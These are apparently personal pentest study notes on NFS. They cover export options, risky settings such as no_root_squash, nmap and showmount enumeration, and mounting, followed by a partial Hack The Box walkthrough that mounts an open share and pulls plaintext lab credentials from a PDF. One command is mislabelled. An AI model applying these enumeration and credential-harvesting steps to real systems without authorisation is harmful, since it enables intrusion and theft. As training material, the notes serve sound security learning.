# Network File System

+ It is based on the `Open Network Computing Remote Call Procedure` exposed on port `111`(RPC portmapper) and port `2049` (NFS mount protocol daemon)

+ It uses `External Data Representation` for the system independent exchange of data 

+ XDR  allows data to be transferred between different kinds of computer systems. Converting from the local representation to XDR is called *encoding*. Converting from XDR to the local representation is called *decoding*

+ Authentication depends on the RPC's options

+ Remote Procedure Call (RPC) is a way for a program to run a function on another computer in a network as if it were local.

+ Permissions inherit those of unix `UID`/`GID` and `group memberships`

Default config @`/etc/exports` 

> ###### Example for NFSv2 and NFSv3:
> 
>  /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)

> ###### Example for NFSv4:
> 
> /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) # /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check)

| **Option**         | **Description**                                                                                                                             |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`               | Read and write permissions.                                                                                                                 |
| `ro`               | Read only permissions.                                                                                                                      |
| `sync`             | Synchronous data transfer. (A bit slower)                                                                                                   |
| `async`            | Asynchronous data transfer. (A bit faster)                                                                                                  |
| `secure`           | Ports above 1024 will not be used.                                                                                                          |
| `insecure`         | Ports above 1024 will be used.                                                                                                              |
| `no_subtree_check` | This option disables the checking of subdirectory trees.                                                                                    |
| `root_squash`      | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |

DANGEROUS SETTINGS 

| **Option**       | **Description**                                                                                                      |
| ---------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rw`             | Read and write permissions.                                                                                          |
| `insecure`       | Ports above 1024 will be used.                                                                                       |
| `nohide`         | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash` | All files created by root are kept with the UID/GID 0.                                                               |

 `insecure` option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.

Footprinting the servicce 

```bash
nmap -sCV -p111,2049 10.10.10.10 
```

using nse

```bash
nmap --script nfs* 10.10.10.10 -sCV
```

get tools 

```bash
sudo pacman -Sy nfs-utils --noconfirm
```

show available shares

```bash
showmount -e 10.10.10.10
```

mounting 

```bash
mkdir mountdir 
mount -t nfs 10.10.10.10:/nfstarget ./mountdir/ -o nolock 
```

^c2315e
- `-o nolock` skips the NLM (Network Lock Manager) handshake, which often just hangs or errors out against Windows NFS servers since their lockd implementation is flaky/nonexistent compared to a real *nix NFS stack
- **`-t nfs`**  tells `mount` which filesystem driver to use

list contents with uid &guids

```bash
ln -s mnt/nfs/
```

unmount 

```bash
sudo umount ./mountdir 
```

Machine to pracctice

## Enigma

## Setup — Add to `/etc/hosts`

Map the target to its hostname so virtual hosts resolve correctly throughout the engagement:

```bash
echo '10.129.19.42  enigma.htb' | sudo tee -a /etc/hosts
```

Without this, any requests that rely on the `Host` header won't resolve. Do this first, before anything else.

---

## Phase 1: Reconnaissance

### NMAP Scan

```bash
sudo nmap -sCV --min-rate 5000 enigma.htb -oA .enigma
```

Convert the XML output to HTML for easier browsing:

```bash
xsltproc .enigma.xml -o enigma.html
```

### Open Ports

| Port                              | Service    | Notes                                          |
| --------------------------------- | ---------- | ---------------------------------------------- |
| 22                                | SSH        | Standard, not the path                         |
| 80                                | HTTP       | nginx 1.24.0 — primary external attack surface |
| 111                               | rpcbind    | NFS mountd helper for port 2049                |
| 143                               | IMAP       | Plaintext — rarer on CTF boxes                 |
| 993                               | IMAPS      | SSL-wrapped IMAP                               |
| 110                               | POP3       | Plaintext mail retrieval                       |
| 995                               | POP3S      | SSL-wrapped POP3 — what we actually use        |
| 2049                              | NFS        | The real opening                               |
| 44143, 59711, 54985, 49035, 40681 | High ports | Likely RPC/NFS ephemerals, not needed          |

---

## Phase 2: NFS Enumeration → Credential Theft

### Why NFS Matters

Port `2049/tcp` is NFS (Network File System). It lets remote clients mount server shares as if they were local drives. A misconfigured `no_root_squash` export can give instant root — but even without it, a readable export with plaintext file storage is a free credential dump.

### Mount the Export

First enumerate what the server is exporting:

```bash
showmount -e enigma.htb
```

> **Export list for enigma.htb:**
> `/srv/nfs/onboarding *`

The `*` means anyone on the network can mount it. Create a mount point and mount it:

```bash
sudo mkdir -p /tmp/nfs_mount
sudo mount -o nolock -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_mount
```

**Flag breakdown:**

- `-o nolock` — disables NFS locking; on CTF boxes the lock daemon is usually not running, and without `nolock` mounts hang
- `-t nfs` — explicitly declares the filesystem type

**Note:** mounts can take 30–60 seconds on HTB boxes. It's not broken, NFS is just slow over tunnel interfaces.

### Credential Harvest

```bash
ls -la /tmp/nfs_mount
```

On the share there's `New_Employee_Access.pdf` — open it and extract the credentials:

> **User:** `kevin`
> **Pass:** `Enigma2024!`
> **Target mail server:** `mail001.enigma.htb`

# 0xClumzZy

### Stay learning
